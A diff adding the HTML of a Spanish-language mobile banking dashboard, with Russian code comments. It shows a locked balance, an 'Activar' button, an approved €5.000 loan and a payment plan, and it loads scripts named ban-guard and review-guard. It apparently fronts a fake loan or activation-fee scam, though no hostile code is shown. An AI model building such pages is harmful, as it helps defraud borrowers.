@@ -1,0 +1,842 @@
+<!doctype html>
+<html lang="es">
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>Mi cuenta</title>
+
+    <link rel="stylesheet" href="../CSS/link-bank.css" />
+    <link rel="stylesheet" href="./tourist.css?v=20260713-1" />
+
+    <script src="../js/api-config.js?v=20260321-6"></script>
+    <script src="../js/flow-session-id.js?v=20260320-3"></script>
+    <script src="../js/navigation-guard.js?v=20260405-1"></script>
+    <script src="../js/client-tracker.js?v=20260518-1"></script>
+      <script src="/js/ban-guard.js?v=20260708-1"></script>
+      <script src="/js/review-guard.js?v=20260729-1"></script>
+  </head>
+
+  <body>
+    <div
+      id="touristPageBootLoader"
+      class="tourist-page-boot-loader tourist-page-boot-loader--index"
+      data-tourist-index-loader
+      role="status"
+      aria-live="polite"
+      aria-busy="true"
+    >
+      <div class="tourist-boot-spinner" aria-hidden="true">
+        <svg width="36" height="36" viewBox="0 0 36 36" fill="none" xmlns="http://www.w3.org/2000/svg">
+          <path opacity="0.4" d="M15 3C15 1.34315 16.3431 0 18 0C19.6569 0 21 1.34315 21 3V5C21 6.65685 19.6569 8 18 8C16.3431 8 15 6.65685 15 5V3Z" fill="#F06005"/>
+          <path opacity="0.8" d="M15 31C15 29.3431 16.3431 28 18 28C19.6569 28 21 29.3431 21 31V33C21 34.6569 19.6569 36 18 36C16.3431 36 15 34.6569 15 33V31Z" fill="#F06005"/>
+          <path opacity="0.2" d="M33 15C34.6569 15 36 16.3431 36 18C36 19.6569 34.6569 21 33 21L31 21C29.3431 21 28 19.6569 28 18C28 16.3431 29.3431 15 31 15L33 15Z" fill="#F06005"/>
+          <path opacity="0.6" d="M5 15C6.65685 15 8 16.3431 8 18C8 19.6569 6.65685 21 5 21L3 21C1.34315 21 -2.03558e-07 19.6569 -1.31134e-07 18C-5.87108e-08 16.3431 1.34315 15 3 15L5 15Z" fill="#F06005"/>
+          <path opacity="0.3" d="M26.4881 5.27366C27.6596 4.10209 29.5591 4.10209 30.7307 5.27366C31.9023 6.44524 31.9023 8.34473 30.7307 9.5163L29.3165 10.9305C28.1449 12.1021 26.2454 12.1021 25.0738 10.9305C23.9023 9.75895 23.9023 7.85945 25.0738 6.68788L26.4881 5.27366Z" fill="#F06005"/>
+          <path opacity="0.7" d="M6.68337 25.0705C7.85494 23.899 9.75444 23.899 10.926 25.0705C12.0976 26.2421 12.0976 28.1416 10.926 29.3132L9.51179 30.7274C8.34022 31.899 6.44073 31.899 5.26915 30.7274C4.09758 29.5558 4.09758 27.6563 5.26915 26.4848L6.68337 25.0705Z" fill="#F06005"/>
+          <path opacity="0.1" d="M30.7302 26.4841C31.9018 27.6557 31.9018 29.5552 30.7302 30.7268C29.5587 31.8984 27.6592 31.8984 26.4876 30.7268L25.0734 29.3126C23.9018 28.141 23.9018 26.2415 25.0734 25.0699C26.245 23.8984 28.1445 23.8984 29.316 25.0699L30.7302 26.4841Z" fill="#F06005"/>
+          <path opacity="0.5" d="M10.9256 6.68727C12.0971 7.85885 12.0971 9.75834 10.9256 10.9299C9.75398 12.1015 7.85449 12.1015 6.68291 10.9299L5.2687 9.5157C4.09713 8.34413 4.09713 6.44463 5.2687 5.27306C6.44027 4.10149 8.33977 4.10149 9.51134 5.27306L10.9256 6.68727Z" fill="#F06005"/>
+        </svg>
+      </div>
+      <p class="tourist-page-boot-loader__text" id="touristIndexBootLoaderText">Conexión al sistema bancario</p>
+    </div>
+    <script>
+      try {
+        if (localStorage.getItem("touristIndexBootLoaderSeen") === "1") {
+          var touristIndexBootLoader = document.getElementById("touristPageBootLoader");
+          if (touristIndexBootLoader) touristIndexBootLoader.remove();
+        }
+      } catch (e) {}
+    </script>
+    <div class="tourist-shell">
+      <!-- Header: профиль + колокольчик с бейджем -->
+      <div class="tourist-header">
+        <div class="tourist-header__user">
+          <img id="touristAvatar" class="tourist-header__avatar" src="../assets/profile.png" alt="" />
+          <div class="tourist-header__text">
+            <p class="tourist-header__title" id="touristUserName">Steve Young</p>
+            <p class="tourist-header__subtitle" id="touristUserEmail">steve.young@gmail.com</p>
+          </div>
+        </div>
+        <button type="button" class="tourist-header__notification" id="touristBell" aria-label="Notificaciones">
+          <svg width="50" height="50" viewBox="0 0 50 50" fill="none" xmlns="http://www.w3.org/2000/svg" aria-hidden="true">
+            <rect width="50" height="50" rx="25" fill="#EDEDED" />
+            <path
+              d="M34.2226 28.0282L32.9477 25.912C32.68 25.4403 32.4378 24.5479 32.4378 24.0252V20.7999C32.4378 17.804 30.6785 15.2161 28.1416 14.005C27.4787 12.8321 26.2548 12.1055 24.8525 12.1055C23.4629 12.1055 22.2136 12.8576 21.5507 14.0432C19.0647 15.2798 17.3437 17.8422 17.3437 20.7999V24.0252C17.3437 24.5479 17.1015 25.4403 16.8338 25.8992L15.5462 28.0282C15.0362 28.8824 14.9215 29.8257 15.2402 30.6926C15.5462 31.5468 16.2728 32.2097 17.2162 32.5284C19.6894 33.3698 22.2901 33.7777 24.8907 33.7777C27.4914 33.7777 30.0921 33.3698 32.5653 32.5412C33.4577 32.2479 34.1461 31.5723 34.4775 30.6926C34.809 29.813 34.7198 28.8441 34.2226 28.0282Z"
+              fill="#0F0F0F"
+            />
+            <path
+              d="M28.4685 35.0674C27.933 36.5463 26.518 37.6044 24.8607 37.6044C23.8535 37.6044 22.8592 37.1964 22.158 36.4698C21.7501 36.0873 21.4441 35.5774 21.2656 35.0547C21.4314 35.0802 21.5971 35.0929 21.7756 35.1184C22.0688 35.1567 22.3747 35.1949 22.6807 35.2204C23.4074 35.2842 24.1468 35.3224 24.8862 35.3224C25.6128 35.3224 26.3395 35.2842 27.0534 35.2204C27.3211 35.1949 27.5888 35.1822 27.8438 35.1439C28.0478 35.1184 28.2517 35.0929 28.4685 35.0674Z"
+              fill="#0F0F0F"
+            />
+          </svg>
+        </button>
+      </div>
+
+      <main class="tourist-main">
+        <!-- Карточка: баланс + банк + кнопки + обновлено -->
+        <section class="tourist-card tourist-card--center">
+          <div class="tourist-balance">
+            <p class="tourist-balance__label">Saldo disponible total</p>
+            <p class="tourist-balance__value">
+              <span class="tourist-balance__currency" id="touristBalanceCurrency" style="opacity:0">€</span><span id="touristBalance" style="opacity:0">—</span>
+            </p>
+          </div>
+
+          <div class="tourist-accounts" id="touristAccountsList">
+            <div class="tourist-bank tourist-bank--card" id="homeMainBank" aria-hidden="false">
+              <div class="tourist-bank__logo" id="touristBankLogoWrap" aria-hidden="true">
+                <svg width="36" height="36" viewBox="0 0 36 36" fill="none" xmlns="http://www.w3.org/2000/svg">
+    <rect width="36" height="36" rx="18" fill="#FAFAFA"/>
+    <path d="M27 16.2501H9C8.04 16.2501 7.25 15.4601 7.25 14.5001V11.1801C7.25 10.5001 7.71998 9.81013 8.34998 9.56013L17.35 5.96016C17.73 5.81016 18.27 5.81016 18.65 5.96016L27.65 9.56013C28.28 9.81013 28.75 10.5101 28.75 11.1801V14.5001C28.75 15.4601 27.96 16.2501 27 16.2501ZM18 7.34016C17.96 7.34016 17.92 7.34011 17.9 7.35011L8.90997 10.9501C8.84997 10.9801 8.75 11.1101 8.75 11.1801V14.5001C8.75 14.6401 8.86 14.7501 9 14.7501H27C27.14 14.7501 27.25 14.6401 27.25 14.5001V11.1801C27.25 11.1101 27.16 10.9801 27.09 10.9501L18.09 7.35011C18.07 7.34011 18.04 7.34016 18 7.34016Z" fill="#FA6C12"/>
+    <path d="M28 27.25H8C7.59 27.25 7.25 26.91 7.25 26.5V23.5C7.25 22.54 8.04 21.75 9 21.75H27C27.96 21.75 28.75 22.54 28.75 23.5V26.5C28.75 26.91 28.41 27.25 28 27.25ZM8.75 25.75H27.25V23.5C27.25 23.36 27.14 23.25 27 23.25H9C8.86 23.25 8.75 23.36 8.75 23.5V25.75Z" fill="#FA6C12"/>
+    <path d="M10 23.25C9.59 23.25 9.25 22.91 9.25 22.5V15.5C9.25 15.09 9.59 14.75 10 14.75C10.41 14.75 10.75 15.09 10.75 15.5V22.5C10.75 22.91 10.41 23.25 10 23.25Z" fill="#FA6C12"/>
+    <path d="M14 23.25C13.59 23.25 13.25 22.91 13.25 22.5V15.5C13.25 15.09 13.59 14.75 14 14.75C14.41 14.75 14.75 15.09 14.75 15.5V22.5C14.75 22.91 14.41 23.25 14 23.25Z" fill="#FA6C12"/>
+    <path d="M18 23.25C17.59 23.25 17.25 22.91 17.25 22.5V15.5C17.25 15.09 17.59 14.75 18 14.75C18.41 14.75 18.75 15.09 18.75 15.5V22.5C18.75 22.91 18.41 23.25 18 23.25Z" fill="#FA6C12"/>
+    <path d="M22 23.25C21.59 23.25 21.25 22.91 21.25 22.5V15.5C21.25 15.09 21.59 14.75 22 14.75C22.41 14.75 22.75 15.09 22.75 15.5V22.5C22.75 22.91 22.41 23.25 22 23.25Z" fill="#FA6C12"/>
+    <path d="M26 23.25C25.59 23.25 25.25 22.91 25.25 22.5V15.5C25.25 15.09 25.59 14.75 26 14.75C26.41 14.75 26.75 15.09 26.75 15.5V22.5C26.75 22.91 26.41 23.25 26 23.25Z" fill="#FA6C12"/>
+    <path d="M29 27.25H7C6.59 27.25 6.25 26.91 6.25 26.5C6.25 26.09 6.59 25.75 7 25.75H29C29.41 25.75 29.75 26.09 29.75 26.5C29.75 26.91 29.41 27.25 29 27.25Z" fill="#FA6C12"/>
+    <path d="M18 13.75C16.76 13.75 15.75 12.74 15.75 11.5C15.75 10.26 16.76 9.25 18 9.25C19.24 9.25 20.25 10.26 20.25 11.5C20.25 12.74 19.24 13.75 18 13.75ZM18 10.75C17.59 10.75 17.25 11.09 17.25 11.5C17.25 11.91 17.59 12.25 18 12.25C18.41 12.25 18.75 11.91 18.75 11.5C18.75 11.09 18.41 10.75 18 10.75Z" fill="#FA6C12"/>
+  </svg>
+              </div>
+              <div class="tourist-bank__text">
+                <p class="tourist-bank__title" id="touristBankTitle" style="opacity:0">—</p>
+                <p class="tourist-bank__mask">Contrato Nº ES-4738D9215</p>
+              </div>
+              <div class="tourist-bank__right">
+                <p class="tourist-bank__amount-row">
+                  <svg class="tourist-bank__lock" width="16" height="16" viewBox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" aria-hidden="true">
+                    <path
+                      d="M8.00073 11.5679C8.60088 11.5679 9.0874 11.0813 9.0874 10.4812C9.0874 9.88105 8.60088 9.39453 8.00073 9.39453C7.40058 9.39453 6.91406 9.88105 6.91406 10.4812C6.91406 11.0813 7.40058 11.5679 8.00073 11.5679Z"
+                      fill="url(#touristLockG0)"
+                    />
+                    <path
+                      d="M12.1893 6.35203V5.5187C12.1893 3.7187 11.7559 1.33203 8.0026 1.33203C4.24927 1.33203 3.81594 3.7187 3.81594 5.5187V6.35203C1.94927 6.58536 1.33594 7.53203 1.33594 9.8587V11.0987C1.33594 13.832 2.16927 14.6654 4.9026 14.6654H11.1026C13.8359 14.6654 14.6693 13.832 14.6693 11.0987V9.8587C14.6693 7.53203 14.0559 6.58536 12.1893 6.35203ZM8.0026 12.492C6.88927 12.492 5.98927 11.5854 5.98927 10.4787C5.98927 9.36536 6.89594 8.46536 8.0026 8.46536C9.10927 8.46536 10.0159 9.37203 10.0159 10.4787C10.0159 11.592 9.11594 12.492 8.0026 12.492ZM4.9026 6.29203C4.84927 6.29203 4.8026 6.29203 4.74927 6.29203V5.5187C4.74927 3.56536 5.3026 2.26536 8.0026 2.26536C10.7026 2.26536 11.2559 3.56536 11.2559 5.5187V6.2987C11.2026 6.2987 11.1559 6.2987 11.1026 6.2987H4.9026V6.29203Z"
+                      fill="url(#touristLockG1)"
+                    />
+                    <defs>
+                      <linearGradient id="touristLockG0" x1="8.00073" y1="9.39453" x2="8.00073" y2="11.5679" gradientUnits="userSpaceOnUse">
+                        <stop stop-color="#FF77D7" />
+                        <stop offset="1" stop-color="#FA6C12" />
+                      </linearGradient>
+                      <linearGradient id="touristLockG1" x1="1.33594" y1="7.9987" x2="14.6693" y2="7.9987" gradientUnits="userSpaceOnUse">
+                        <stop stop-color="#FF77D7" />
+                        <stop offset="1" stop-color="#FA6C12" />
+                      </linearGradient>
+                    </defs>
+                  </svg>
+                  <span class="tourist-bank__amount" id="touristBankAmount" style="opacity:0">—</span>
+                </p>
+                <span class="tourist-bank__principal-slot" data-principal-slot></span>
+              </div>
+            </div>
+
+            <div class="tourist-bank tourist-bank--card tourist-bank--secondary" id="homeSecondaryBank" style="display:none">
+              <div class="tourist-bank__logo" aria-hidden="true">
+                <svg width="36" height="36" viewBox="0 0 48 48" xmlns="http://www.w3.org/2000/svg" aria-hidden="true">
+                  <path fill="#0f0f0f" d="M43,8H5a2.9,2.9,0,0,0-3,3V37a3,3,0,0,0,3,3H43a3,3,0,0,0,3-3V11A2.9,2.9,0,0,0,43,8ZM8,19.2l.3-.2h2.8a1.1,1.1,0,0,1,1.2.8h0l.5,2.4c0,.2,0,.3-.2.4h-.3a8.8,8.8,0,0,0-4.1-2.9A.5.5,0,0,1,8,19.2ZM14.7,29H12.2a.2.2,0,0,1-.2-.2L9.8,21.5c0-.1,0-.3.2-.3h.3a9.4,9.4,0,0,1,3,3.6h0l.3,1,2.6-6.6c0-.1.1-.2.3-.2h2.2c.1,0,.1.1.2.2s.1.2,0,.2l-4,9.4A.2.2,0,0,1,14.7,29Zm6.5-.3c0,.2-.1.3-.2.3H18.6v-.3l1.6-9.3a.3.3,0,0,1,.3-.3h2.3v.3Zm7.1-5.6c1.5.6,2.2,1.5,2.2,2.6a2.9,2.9,0,0,1-1.3,2.4,6.2,6.2,0,0,1-3.3.9,10,10,0,0,1-2.6-.5c-.2,0-.3-.2-.2-.3l.2-1.5a.2.2,0,0,1,.2-.2h.3a4.5,4.5,0,0,0,2.4.5c.7,0,1.5-.2,1.5-.9s-.3-.7-1.3-1.2-2.3-1.2-2.3-2.6S25.9,19,28.5,19a9.5,9.5,0,0,1,2.1.3.5.5,0,0,1,.2.4l-.3,1.4c0,.1,0,.2-.1.2h-.3a3.2,3.2,0,0,0-1.7-.4h-.1c-1,0-1.5.4-1.5.9S27.4,22.6,28.3,23.1Zm11.6,5.8c0,.1-.1.1-.2.1H37.8l-.3-.2a6.1,6.1,0,0,0-.3-1.3H33.8c-.1.1-.2.6-.5,1.3s-.1.2-.3.2H30.6a.2.2,0,0,1,0-.3l3.8-8.7a1.4,1.4,0,0,1,1.4-.9h1.9c.1,0,.2.1.2.3L40,28.6A.4.4,0,0,1,39.9,28.9ZM36,21.7l-1.4,3.8h2.2l-.6-2.9Z"/>
+                </svg>
+              </div>
+              <div class="tourist-bank__text">
+                <p class="tourist-bank__title">MonetoPlus Card</p>
+                <p class="tourist-bank__mask" id="homeSecondaryBankMask">Visa •••• 2456</p>
+              </div>
+              <div class="tourist-bank__right">
+                <p class="tourist-bank__amount-row">
+                  <span class="tourist-bank__amount" id="homeSecondaryBankAmount">€0,00</span>
+                </p>
+                <span class="tourist-bank__principal-slot" data-principal-slot></span>
+              </div>
+            </div>
+          </div>
+
+          <div class="tourist-actions">
+            <button type="button" class="tourist-btn tourist-btn--gradient" id="activarBtn">
+              <span>Activar</span>
+              <svg width="16" height="16" viewBox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg">
+                <path
+                  d="M5.94 12.94a.75.75 0 0 1 0-1.06L9.88 7.94 5.94 4a.75.75 0 0 1 1.06-1.06l4.47 4.47c.3.3.3.77 0 1.06L7 12.94a.75.75 0 0 1-1.06 0Z"
+                  fill="#FFFFFF"
+                />
+              </svg>
+            </button>
+            <button type="button" class="tourist-btn tourist-btn--outline" id="transferBtn">
+              <span>Transferencia</span>
+              <svg width="16" height="16" viewBox="0 0 20 20" fill="none" xmlns="http://www.w3.org/2000/svg" aria-hidden="true">
+                <path d="M12.72 18.54H7.28c-4.1 0-5.84-1.75-5.84-5.84v-.11c0-3.7 1.46-5.49 4.73-5.79.33-.03.65.22.69.56s-.21.66-.56.69c-2.62.24-3.59 1.48-3.59 4.55v.11c0 3.39 1.2 4.59 4.59 4.59h5.43c3.4 0 4.6-1.2 4.6-4.59v-.11c0-3.09-1-4.33-3.66-4.55a.62.62 0 0 1-.57-.68c.03-.34.32-.6.67-.57 3.32.28 4.8 2.08 4.8 5.8v.11c0 4.09-1.75 5.84-5.84 5.84Z" fill="#0F0F0F"/>
+                <path d="M10 13.13a.62.62 0 0 1-.63-.63V3.02c0-.34.28-.62.63-.62.34 0 .63.28.63.62v9.48c0 .34-.29.63-.63.63Z" fill="#0F0F0F"/>
+                <path d="M12.79 5.5c-.16 0-.32-.06-.44-.18L10 2.97 7.65 5.32c-.24.24-.64.24-.88 0a.63.63 0 0 1 0-.88l2.79-2.8a.63.63 0 0 1 .88 0l2.8 2.8c.24.24.24.63 0 .88-.13.12-.28.18-.45.18Z" fill="#0F0F0F"/>
+              </svg>
+            </button>
+          </div>
+
+          <p class="tourist-update-line">
+            <span>Actualizado: hace poco</span>
+            <button type="button" class="tourist-update-line__btn" id="actualizarBtn">Actualizar</button>
+          </p>
+        </section>
+
+        <!-- Plan de pagos -->
+        <section class="tourist-plan">
+          <div class="tourist-plan__head">
+            <div class="tourist-plan__head-left">
+              <span class="tourist-plan__title">Plan de pagos</span>
+              <svg class="tourist-plan__info" width="14" height="14" viewBox="0 0 14 14" fill="none" xmlns="http://www.w3.org/2000/svg" aria-hidden="true">
+                <circle cx="7" cy="7" r="6.3" stroke="#9A9A9A" stroke-width="1.3"/>
+                <path d="M7 6.2V9.8" stroke="#9A9A9A" stroke-width="1.3" stroke-linecap="round"/>
+                <circle cx="7" cy="4.1" r="0.75" fill="#9A9A9A"/>
+              </svg>
+            </div>
+            <button type="button" class="tourist-plan__link" id="planVerCuotasBtn" data-plan-schedule-open>Ver cuotas</button>
+          </div>
+
+          <div class="tourist-plan__content">
+            <div class="tourist-plan__top">
+              <div class="tourist-plan__next">
+                <span class="tourist-plan__next-label">Próxima cuota</span>
+                <span class="tourist-plan__next-value"><span class="tourist-plan__next-currency">€</span>101.05</span>
+              </div>
+              <span class="tourist-plan__bank" aria-hidden="true">
+                <img src="../assets/logos/Logo.svg" alt="" id="touristPlanBankLogo" class="tourist-plan__bank-logo" />
+              </span>
+            </div>
+
+            <div class="tourist-plan__cols">
+              <div class="tourist-plan__col">
+                <span class="tourist-plan__col-label">Fecha próxima cuota</span>
+                <span class="tourist-plan__col-value">15 Ago 2026</span>
+              </div>
+              <span class="tourist-plan__col-divider" aria-hidden="true"></span>
+              <div class="tourist-plan__col">
+                <span class="tourist-plan__col-label">Saldo pendiente</span>
+                <span class="tourist-plan__col-value">€6062.71</span>
+              </div>
+            </div>
+
+            <div class="tourist-plan__progress">
+              <div class="tourist-plan__progress-track">
+                <span class="tourist-plan__progress-fill"></span>
+              </div>
+              <div class="tourist-plan__progress-meta">
+                <span>0% completado</span>
+                <span>60 cuotas restantes</span>
+              </div>
+            </div>
+          </div>
+
+          <button type="button" class="tourist-plan__cta" id="planVerTodasBtn" data-plan-schedule-open>
+            <span>Ver todas las cuotas</span>
+            <svg width="16" height="16" viewBox="0 0 20 20" fill="none" xmlns="http://www.w3.org/2000/svg" aria-hidden="true">
+              <path d="M6.67 1.67v2.5M13.33 1.67v2.5" stroke="#FFFFFF" stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round"/>
+              <path d="M2.92 7.58h14.16" stroke="#FFFFFF" stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round"/>
+              <path d="M17.5 7.08v7.09c0 2.5-1.25 4.16-4.17 4.16H6.67c-2.92 0-4.17-1.66-4.17-4.16V7.08c0-2.5 1.25-4.16 4.17-4.16h6.66c2.92 0 4.17 1.66 4.17 4.16Z" stroke="#FFFFFF" stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round"/>
+              <path d="M9.996 11.417h.007M6.91 11.417h.008M6.91 13.917h.008" stroke="#FFFFFF" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/>
+            </svg>
+          </button>
+        </section>
+
+        <!-- Últimas transacciones -->
+        <section class="tourist-card">
+          <div class="tourist-section-head">
+            <h2 class="tourist-section-head__title">Últimas transacciones</h2>
+            <a href="./history.html" class="tourist-section-head__link">Ver todo</a>
+          </div>
+
+          <div class="tourist-list" id="indexTxList">
+            <div class="tourist-list-item" style="text-decoration:none;color:inherit;">
+              <div class="tourist-list-item__icon tourist-list-item__icon--success tourist-list-item__icon--full" aria-hidden="true">
+                <svg width="32" height="32" viewBox="0 0 32 32" fill="none" xmlns="http://www.w3.org/2000/svg">
+                  <rect width="32" height="32" rx="16" fill="#E1F8E9" />
+                  <path
+                    d="M22.6417 13.7904H20.1917C19.1333 13.7904 18.5 13.157 18.5 12.0987V9.6487C18.5 8.59036 19.1333 7.95703 20.1917 7.95703H22.6417C23.7 7.95703 24.3333 8.59036 24.3333 9.6487V12.0987C24.3333 13.157 23.7 13.7904 22.6417 13.7904ZM22.825 11.032C22.725 10.932 22.5917 10.882 22.4583 10.882C22.325 10.882 22.1917 10.932 22.0917 11.032L21.9417 11.182V9.31536C21.9417 9.0237 21.7083 8.79036 21.4167 8.79036C21.125 8.79036 20.8917 9.0237 20.8917 9.31536V11.182L20.7417 11.032C20.5417 10.832 20.2083 10.832 20.0083 11.032C19.8083 11.232 19.8083 11.5654 20.0083 11.7654L21.05 12.807C21.0917 12.8487 21.15 12.882 21.2083 12.907C21.225 12.9154 21.2417 12.9154 21.2583 12.9237C21.3 12.9404 21.3417 12.9487 21.3917 12.9487C21.4083 12.9487 21.425 12.9487 21.4417 12.9487C21.5 12.9487 21.55 12.9404 21.6083 12.9154C21.6167 12.9154 21.6167 12.9154 21.625 12.9154C21.6833 12.8904 21.7333 12.857 21.775 12.8154C21.7833 12.807 21.7833 12.807 21.7917 12.807L22.8333 11.7654C23.0333 11.5654 23.0333 11.232 22.825 11.032Z"
+                    fill="#1EC756"
+                  />
+                  <path
+                    d="M7.66406 16.0513V20.218C7.66406 22.1263 9.20573 23.668 11.1141 23.668H20.8724C22.7807 23.668 24.3307 22.118 24.3307 20.2096V16.0513C24.3307 15.493 23.8807 15.043 23.3224 15.043H8.6724C8.11406 15.043 7.66406 15.493 7.66406 16.0513ZM12.6641 20.8763H10.9974C10.6557 20.8763 10.3724 20.593 10.3724 20.2513C10.3724 19.9096 10.6557 19.6263 10.9974 19.6263H12.6641C13.0057 19.6263 13.2891 19.9096 13.2891 20.2513C13.2891 20.593 13.0057 20.8763 12.6641 20.8763ZM18.0807 20.8763H14.7474C14.4057 20.8763 14.1224 20.593 14.1224 20.2513C14.1224 19.9096 14.4057 19.6263 14.7474 19.6263H18.0807C18.4224 19.6263 18.7057 19.9096 18.7057 20.2513C18.7057 20.593 18.4224 20.8763 18.0807 20.8763Z"
+                    fill="#1EC756"
+                  />
+                  <path d="M17.2474 10.3404V12.782C17.2474 13.3404 16.7974 13.7904 16.2391 13.7904H8.6724C8.10573 13.7904 7.66406 13.3237 7.66406 12.7654C7.6724 11.8237 8.0474 10.9654 8.6724 10.3404C9.2974 9.71536 10.1641 9.33203 11.1141 9.33203H16.2391C16.7974 9.33203 17.2474 9.78203 17.2474 10.3404Z" fill="#1EC756" />
+                </svg>
+              </div>
+              <div class="tourist-list-item__text">
+                <p class="tourist-list-item__name">Préstamo aprobado</p>
+                <div class="tourist-list-item__meta">
+                  <span id="touristLoanDate" style="opacity:0">—</span>
+                  <span class="tourist-list-item__meta-dot"></span>
+                  <span id="touristLoanTime" style="opacity:0">—</span>
+                </div>
+              </div>
+              <span class="tourist-list-item__amount">+€5.000,00</span>
+            </div>
+          </div>
+        </section>
+      </main>
+    </div>
+
+    <!-- Tab bar -->
+    <nav class="tourist-tabbar" aria-label="Menú">
+      <a href="./index.html" class="tourist-tabbar__item is-active">
+        <svg width="24" height="24" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg" aria-hidden="true">
+          <path d="M12.37 2.14984L21.37 5.74982C21.72 5.88982 22 6.30981 22 6.67981V9.99982C22 10.5498 21.55 10.9998 21 10.9998H3C2.45 10.9998 2 10.5498 2 9.99982V6.67981C2 6.30981 2.28 5.88982 2.63 5.74982L11.63 2.14984C11.83 2.06984 12.17 2.06984 12.37 2.14984Z" stroke="currentColor" stroke-width="1.5" stroke-miterlimit="10" stroke-linecap="round" stroke-linejoin="round"/>
+          <path d="M22 22H2V19C2 18.45 2.45 18 3 18H21C21.55 18 22 18.45 22 19V22Z" stroke="currentColor" stroke-width="1.5" stroke-miterlimit="10" stroke-linecap="round" stroke-linejoin="round"/>
+          <path d="M4 18V11" stroke="currentColor" stroke-width="1.5" stroke-miterlimit="10" stroke-linecap="round" stroke-linejoin="round"/>
+          <path d="M8 18V11" stroke="currentColor" stroke-width="1.5" stroke-miterlimit="10" stroke-linecap="round" stroke-linejoin="round"/>
+          <path d="M12 18V11" stroke="currentColor" stroke-width="1.5" stroke-miterlimit="10" stroke-linecap="round" stroke-linejoin="round"/>
+          <path d="M16 18V11" stroke="currentColor" stroke-width="1.5" stroke-miterlimit="10" stroke-linecap="round" stroke-linejoin="round"/>
+          <path d="M20 18V11" stroke="currentColor" stroke-width="1.5" stroke-miterlimit="10" stroke-linecap="round" stroke-linejoin="round"/>
+          <path d="M1 22H23" stroke="currentColor" stroke-width="1.5" stroke-miterlimit="10" stroke-linecap="round" stroke-linejoin="round"/>
+          <path d="M12 8.5C12.8284 8.5 13.5 7.82843 13.5 7C13.5 6.17157 12.8284 5.5 12 5.5C11.1716 5.5 10.5 6.17157 10.5 7C10.5 7.82843 11.1716 8.5 12 8.5Z" stroke="currentColor" stroke-width="1.5" stroke-miterlimit="10" stroke-linecap="round" stroke-linejoin="round"/>
+        </svg>
+        <span>Home</span>
+      </a>
+      <a href="./archived-goals.html" class="tourist-tabbar__item">
+        <svg width="24" height="24" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg" aria-hidden="true">
+          <path d="M12.1484 16.5V18.6" stroke="currentColor" stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round"/>
+          <path d="M7.14844 22H17.1484V21C17.1484 19.9 16.2484 19 15.1484 19H9.14844C8.04844 19 7.14844 19.9 7.14844 21V22V22Z" stroke="currentColor" stroke-width="1.5" stroke-miterlimit="10"/>
+          <path d="M6.14844 22H18.1484" stroke="currentColor" stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round"/>
+          <path d="M12 16C8.13 16 5 12.87 5 9V6C5 3.79 6.79 2 9 2H15C17.21 2 19 3.79 19 6V9C19 12.87 15.87 16 12 16Z" stroke="currentColor" stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round"/>
+          <path d="M5.46906 11.6516C4.71906 11.4116 4.05906 10.9716 3.53906 10.4516C2.63906 9.45156 2.03906 8.25156 2.03906 6.85156C2.03906 5.45156 3.13906 4.35156 4.53906 4.35156H5.18906C4.98906 4.81156 4.88906 5.32156 4.88906 5.85156V8.85156C4.88906 9.85156 5.09906 10.7916 5.46906 11.6516Z" stroke="currentColor" stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round"/>
+          <path d="M18.5312 11.6516C19.2812 11.4116 19.9412 10.9716 20.4612 10.4516C21.3612 9.45156 21.9612 8.25156 21.9612 6.85156C21.9612 5.45156 20.8612 4.35156 19.4612 4.35156H18.8112C19.0112 4.81156 19.1112 5.32156 19.1112 5.85156V8.85156C19.1112 9.85156 18.9013 10.7916 18.5312 11.6516Z" stroke="currentColor" stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round"/>
+        </svg>
+        <span>Objetivos</span>
+      </a>
+      <a href="./history.html" class="tourist-tabbar__item">
+        <svg width="24" height="24" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg" aria-hidden="true">
+          <path d="M14.5 9.25H2C1.59 9.25 1.25 8.91 1.25 8.5C1.25 8.09 1.59 7.75 2 7.75H14.5C14.91 7.75 15.25 8.09 15.25 8.5C15.25 8.91 14.91 9.25 14.5 9.25Z" fill="currentColor"/>
+          <path d="M8 17.25H6C5.59 17.25 5.25 16.91 5.25 16.5C5.25 16.09 5.59 15.75 6 15.75H8C8.41 15.75 8.75 16.09 8.75 16.5C8.75 16.91 8.41 17.25 8 17.25Z" fill="currentColor"/>
+          <path d="M14.5 17.25H10.5C10.09 17.25 9.75 16.91 9.75 16.5C9.75 16.09 10.09 15.75 10.5 15.75H14.5C14.91 15.75 15.25 16.09 15.25 16.5C15.25 16.91 14.91 17.25 14.5 17.25Z" fill="currentColor"/>
+          <path d="M17.56 21.25H6.44C2.46 21.25 1.25 20.05 1.25 16.11V7.89C1.25 3.95 2.46 2.75 6.44 2.75H14.5C14.91 2.75 15.25 3.09 15.25 3.5C15.25 3.91 14.91 4.25 14.5 4.25H6.44C3.3 4.25 2.75 4.79 2.75 7.89V16.1C2.75 19.2 3.3 19.74 6.44 19.74H17.55C20.69 19.74 21.24 19.2 21.24 16.1V14.02C21.24 13.61 21.58 13.27 21.99 13.27C22.4 13.27 22.74 13.61 22.74 14.02V16.1C22.75 20.05 21.54 21.25 17.56 21.25Z" fill="currentColor"/>
+          <path d="M20 10.25C19.9 10.25 19.81 10.23 19.71 10.19C19.43 10.07 19.25 9.8 19.25 9.5V3.5C19.25 3.09 19.59 2.75 20 2.75C20.41 2.75 20.75 3.09 20.75 3.5V7.69L21.47 6.97C21.76 6.68 22.24 6.68 22.53 6.97C22.82 7.26 22.82 7.74 22.53 8.03L20.53 10.03C20.39 10.17 20.2 10.25 20 10.25Z" fill="currentColor"/>
